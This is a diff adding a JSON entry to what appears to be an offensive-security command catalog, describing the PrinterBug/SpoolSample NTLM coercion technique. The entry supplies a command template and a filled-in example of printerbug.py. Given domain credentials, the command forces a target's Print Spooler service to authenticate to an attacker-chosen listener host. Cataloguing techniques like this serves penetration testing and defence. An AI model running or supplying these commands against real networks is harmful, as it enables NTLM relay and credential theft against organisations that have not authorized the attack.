@@ -1,0 +1,24 @@
+{
+  "id": "printerbug",
+  "name": "PrinterBug / SpoolSample",
+  "command": "python3 printerbug.py '<domain>/<user>:<password>'@<target_ip> <listener_ip>",
+  "description": "Coerce NTLM authentication using the Print Spooler service (MS-RPRN)",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "rpc",
+    "ntlm"
+  ],
+  "tags": [
+    "printerbug",
+    "spoolsample",
+    "coercion",
+    "ntlm",
+    "spooler"
+  ],
+  "examples": [
+    "python3 printerbug.py 'corp.local/user:password'@192.168.1.100 192.168.1.50"
+  ]
+}
